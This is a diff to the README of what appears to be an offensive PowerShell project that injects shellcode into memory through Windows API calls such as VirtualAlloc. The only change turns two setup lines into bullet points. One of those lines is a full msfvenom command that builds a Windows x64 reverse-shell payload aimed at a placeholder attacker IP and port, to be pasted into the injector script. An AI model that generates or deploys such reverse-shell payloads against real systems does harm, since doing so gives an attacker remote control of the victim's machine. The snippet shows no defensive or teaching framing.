@@ -5,8 +5,8 @@ This project provides a PowerShell script that uses Windows API functions to inj
 
 
 ## Create ShellCode
-Change the line 37.
-msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT -f powershell
+- Change the line 37.
+- msfvenom -p windows/x64/shell_reverse_tcp lhost=YOUR_IP lport=PORT -f powershell
 
 ## Features
 - Allocates memory using `VirtualAlloc`.
